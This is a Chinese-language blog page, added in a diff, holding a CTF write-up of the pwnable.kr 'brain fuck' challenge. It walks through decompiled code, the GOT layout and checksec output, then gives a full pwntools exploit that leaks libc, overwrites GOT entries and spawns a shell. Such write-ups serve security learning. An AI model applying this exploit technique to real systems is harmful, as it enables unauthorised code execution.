@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"voxzz.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Pwnable.kr Rookiss 练习记录。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwnable.kr Rookiss 练习记录">
+<meta property="og:url" content="https://voxzz.github.io/cybersecurity/CTF/pwnable_kr/Pwnable_kr_Rookiss_%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="VBlog">
+<meta property="og:description" content="Pwnable.kr Rookiss 练习记录。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-11-25T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-11-26T09:02:33.296Z">
+<meta property="article:author" content="Voxzz">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://voxzz.github.io/cybersecurity/CTF/pwnable_kr/Pwnable_kr_Rookiss_%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://voxzz.github.io/cybersecurity/CTF/pwnable_kr/Pwnable_kr_Rookiss_%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/","path":"cybersecurity/CTF/pwnable_kr/Pwnable_kr_Rookiss_练习记录/","title":"Pwnable.kr Rookiss 练习记录"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Pwnable.kr Rookiss 练习记录 | VBlog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">VBlog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#brain-fuck"><span class="nav-number">1.</span> <span class="nav-text">brain fuck</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">2.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Voxzz"
+      src="/images/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">Voxzz</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/voxzz" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;voxzz" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:voxzz0@163.com" title="E-Mail → mailto:voxzz0@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://b1ack1e.github.io/" title="https:&#x2F;&#x2F;b1ack1e.github.io" rel="noopener" target="_blank">b1ackie</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://voxzz.github.io/cybersecurity/CTF/pwnable_kr/Pwnable_kr_Rookiss_%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="Voxzz">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="VBlog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Pwnable.kr Rookiss 练习记录 | VBlog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Pwnable.kr Rookiss 练习记录
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-11-26 00:00:00 / 修改时间：17:02:33" itemprop="dateCreated datePublished" datetime="2025-11-26T00:00:00+08:00">2025-11-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>Pwnable.kr Rookiss 练习记录。</p>
+<span id="more"></span>
+
+<h2 id="brain-fuck"><a href="#brain-fuck" class="headerlink" title="brain fuck"></a>brain fuck</h2><p>查看 brainfuck文件的 <code>main()</code> 函数可知，程序通过 <code>stdin</code> 接收一串字符串，然后将字符串中的每个字符作为指令进行解析和执行。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [esp+28h] [ebp-40Ch]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">1024</span>]; <span class="comment">// [esp+2Ch] [ebp-408h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+42Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  p = (<span class="type">int</span>)&amp;tape;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome to brainfuck testing system!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;type some brainfuck instructions except [ ]&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  fgets(s, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); ++i )</span><br><span class="line">    do_brainfuck(s[i]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>do_brainfuck()</code> 函数中，定义了 7 个指令字符，用于执行不同的操作。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">do_brainfuck</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  result = a1 - <span class="number">43</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">      result = p;</span><br><span class="line">      ++*(_BYTE *)p;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">      v2 = (_BYTE *)p;</span><br><span class="line">      result = getchar();</span><br><span class="line">      *v2 = result;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">      result = p;</span><br><span class="line">      --*(_BYTE *)p;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">      result = <span class="built_in">putchar</span>(*(<span class="type">char</span> *)p);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;&lt;&#x27;</span>:</span><br><span class="line">      result = --p;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;&gt;&#x27;</span>:</span><br><span class="line">      result = ++p;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;[ and ] not supported.&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这些指令字符的功能如下。</p>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>+</td>
+<td>将 *p 指向的值加 1。</td>
+</tr>
+<tr>
+<td>,</td>
+<td>从 stdin 接收一个字符存放在 *p 中。</td>
+</tr>
+<tr>
+<td>-</td>
+<td>将 *p 指向的值减 1。</td>
+</tr>
+<tr>
+<td>.</td>
+<td>打印 *p 指向的值。</td>
+</tr>
+<tr>
+<td>&lt;</td>
+<td>将 p 指向的地址减 1。</td>
+</tr>
+<tr>
+<td>&gt;</td>
+<td>将 p 指向的地址加 1。</td>
+</tr>
+<tr>
+<td>[</td>
+<td>打印 “[ and ] not supported.” 字符串。</td>
+</tr>
+</tbody></table>
+<p>指针 <code>p</code> 初始时指向 <code>tape</code> 数组，其位于 <code>.bss</code> 段，大小为 1024 字节。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A065                 align 20h</span><br><span class="line">.bss:0804A080 p               dd ?                    ; DATA XREF: do_brainfuck:loc_80485FE↑r</span><br><span class="line">.bss:0804A080                                         ; do_brainfuck+2A↑w ...</span><br><span class="line">.bss:0804A084                 align 20h</span><br><span class="line">.bss:0804A0A0 tape            db    ? ;               ; DATA XREF: main+6D↑o</span><br><span class="line">.bss:0804A0A1                 db    ? ;</span><br><span class="line">.bss:0804A0A2                 db    ? ;</span><br><span class="line">.bss:0804A0A3                 db    ? ;</span><br><span class="line">.bss:0804A0A4                 db    ? ;</span><br><span class="line">.bss:0804A0A5                 db    ? ;</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>tape</code> 数组不远处，便是程序的 GOT 表。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0804A000 ; ===========================================================================</span><br><span class="line">.got.plt:0804A000</span><br><span class="line">.got.plt:0804A000 ; Segment type: Pure data</span><br><span class="line">.got.plt:0804A000 ; Segment permissions: Read/Write</span><br><span class="line">.got.plt:0804A000 _got_plt        segment dword public &#x27;DATA&#x27; use32</span><br><span class="line">.got.plt:0804A000                 assume cs:_got_plt</span><br><span class="line">.got.plt:0804A000                 ;org 804A000h</span><br><span class="line">.got.plt:0804A000 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC</span><br><span class="line">.got.plt:0804A000                                         ; DATA XREF: _init_proc+9↑o</span><br><span class="line">.got.plt:0804A000                                         ; __libc_csu_init+B↑o ...</span><br><span class="line">.got.plt:0804A004 dword_804A004   dd 0                    ; DATA XREF: sub_8048430↑r</span><br><span class="line">.got.plt:0804A008 dword_804A008   dd 0                    ; DATA XREF: sub_8048430+6↑r</span><br><span class="line">.got.plt:0804A00C off_804A00C     dd offset getchar       ; DATA XREF: _getchar↑r</span><br><span class="line">.got.plt:0804A010 off_804A010     dd offset fgets         ; DATA XREF: _fgets↑r</span><br><span class="line">.got.plt:0804A014 off_804A014     dd offset __stack_chk_fail</span><br><span class="line">.got.plt:0804A014                                         ; DATA XREF: ___stack_chk_fail↑r</span><br><span class="line">.got.plt:0804A018 off_804A018     dd offset puts          ; DATA XREF: _puts↑r</span><br><span class="line">.got.plt:0804A01C off_804A01C     dd offset __gmon_start__</span><br><span class="line">.got.plt:0804A01C                                         ; DATA XREF: ___gmon_start__↑r</span><br><span class="line">.got.plt:0804A020 off_804A020     dd offset strlen        ; DATA XREF: _strlen↑r</span><br><span class="line">.got.plt:0804A024 off_804A024     dd offset __libc_start_main</span><br><span class="line">.got.plt:0804A024                                         ; DATA XREF: ___libc_start_main↑r</span><br><span class="line">.got.plt:0804A028 off_804A028     dd offset setvbuf       ; DATA XREF: _setvbuf↑r</span><br><span class="line">.got.plt:0804A02C off_804A02C     dd offset memset        ; DATA XREF: _memset↑r</span><br><span class="line">.got.plt:0804A030 off_804A030     dd offset putchar       ; DATA XREF: _putchar↑r</span><br><span class="line">.got.plt:0804A030 _got_plt        ends</span><br><span class="line">.got.plt:0804A030</span><br></pre></td></tr></table></figure>
+
+<p>因此，通过传递指令字符，可以控制 <code>p</code> 指针读取或者修改程序 GOT 表中任意条目，实现对任意函数的调用。</p>
+<p>根据程序的代码逻辑，可以将 <code>memset</code> 修改为 <code>gets</code> 函数，将 <code>fgets</code> 修改为 <code>system</code> 函数，将 <code>putchar</code> 修改为 <code>main</code> 函数。当函数 GOT 表修改完毕，调用 <code>.</code> 指令时，程序将再次执行 <code>main</code> 函数，实现任意命令执行。</p>
+<p>查看 brainfuck 和 libc-2.23.so 的保护情况。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">brainfuck@ubuntu:~$ checksec brainfuck</span><br><span class="line">[*] &#x27;/home/brainfuck/brainfuck&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">brainfuck@ubuntu:~$ checksec libc-2.23.so</span><br><span class="line">[!] Could not populate PLT: Cannot allocate 1GB memory to run Unicorn Engine</span><br><span class="line">[*] &#x27;/home/brainfuck/libc-2.23.so&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>由于 <code>libc.so</code> 开启了 PIE 保护，所以需要先泄露 libc 中任意函数的地址，才能正确调用 libc 中的所需函数。</p>
+<p>编写脚本，构造指令字符串。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#target = process(&#x27;./bf&#x27;)</span></span><br><span class="line">target = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">9001</span>)</span><br><span class="line"></span><br><span class="line">bf_bin = ELF(<span class="string">&#x27;/home/brainfuck/brainfuck&#x27;</span>)</span><br><span class="line">libc_bin = ELF(<span class="string">&#x27;/home/brainfuck/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = bf_bin.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">memset_got = bf_bin.got[<span class="string">&#x27;memset&#x27;</span>]</span><br><span class="line">fgets_got = bf_bin.got[<span class="string">&#x27;fgets&#x27;</span>]</span><br><span class="line">putchar_got = bf_bin.got[<span class="string">&#x27;putchar&#x27;</span>]</span><br><span class="line"></span><br><span class="line">putchar_offset = libc_bin.symbols[<span class="string">&#x27;putchar&#x27;</span>]</span><br><span class="line">gets_offset = libc_bin.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">system_offset = libc_bin.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">tape_addr = <span class="number">0x0804A0A0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span> = <span class="string">&#x27;&lt;&#x27;</span> * (tape_addr - putchar_got)</span><br><span class="line"><span class="built_in">input</span> += <span class="string">&#x27;.&#x27;</span></span><br><span class="line"><span class="built_in">input</span> += <span class="string">&#x27;.&gt;.&gt;.&gt;.&#x27;</span></span><br><span class="line"><span class="built_in">input</span> += <span class="string">&#x27;&lt;&lt;&lt;&#x27;</span></span><br><span class="line"><span class="built_in">input</span> += <span class="string">&#x27;,&gt;,&gt;,&gt;,&#x27;</span></span><br><span class="line"><span class="built_in">input</span> += <span class="string">&#x27;&lt;&lt;&lt;&#x27;</span></span><br><span class="line"><span class="built_in">input</span> += <span class="string">&#x27;&gt;&#x27;</span> * (tape_addr - putchar_got)</span><br><span class="line"><span class="built_in">input</span> += <span class="string">&#x27;&lt;&#x27;</span> * (tape_addr - memset_got)</span><br><span class="line"><span class="built_in">input</span> += <span class="string">&#x27;,&gt;,&gt;,&gt;,&#x27;</span></span><br><span class="line"><span class="built_in">input</span> += <span class="string">&#x27;&lt;&lt;&lt;&#x27;</span></span><br><span class="line"><span class="built_in">input</span> += <span class="string">&#x27;&gt;&#x27;</span> * (tape_addr - memset_got)</span><br><span class="line"><span class="built_in">input</span> += <span class="string">&#x27;&lt;&#x27;</span> * (tape_addr - fgets_got)</span><br><span class="line"><span class="built_in">input</span> += <span class="string">&#x27;,&gt;,&gt;,&gt;,&#x27;</span></span><br><span class="line"><span class="built_in">input</span> += <span class="string">&#x27;.&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(target.recvuntil(<span class="string">&#x27;except [ ]\n&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">input</span>)</span><br><span class="line">target.sendline(<span class="built_in">input</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">target.recv(<span class="number">1</span>)</span><br><span class="line">putchar_addr = u32(target.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc_base_addr = putchar_addr - putchar_offset</span><br><span class="line">gets_addr = libc_base_addr + gets_offset</span><br><span class="line">system_addr = libc_base_addr + system_offset</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span> = p32(main_addr)</span><br><span class="line"><span class="built_in">input</span> += p32(gets_addr)</span><br><span class="line"><span class="built_in">input</span> += p32(system_addr)</span><br><span class="line"><span class="built_in">input</span> += <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">target.sendline(<span class="built_in">input</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">target.interactive()</span><br><span class="line">target.close()</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本，得到 flag 信息。</p>
